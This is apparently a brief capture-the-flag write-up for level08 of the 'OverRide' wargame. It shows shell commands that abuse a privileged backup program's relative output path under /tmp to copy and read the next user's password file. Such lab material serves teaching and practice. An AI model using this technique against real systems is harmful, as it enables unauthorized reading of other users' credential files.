1. Convert file to C and analyze code.
Here we see program read file with pass and write it
by way ".backups/."
2. And we need all rules to use it. For it create folder /tmp
level08@OverRide:~$ cd /tmp
3. Make directory for copy:
level08@OverRide:/tmp$ mkdir -p backups/home/users/level09/
3. Run program from tmp:
level08@OverRide:/tmp$ ~/level08 /home/users/level09/.pass
4. See password:
level08@OverRide:/tmp$ cat backups/home/users/level09/.pass
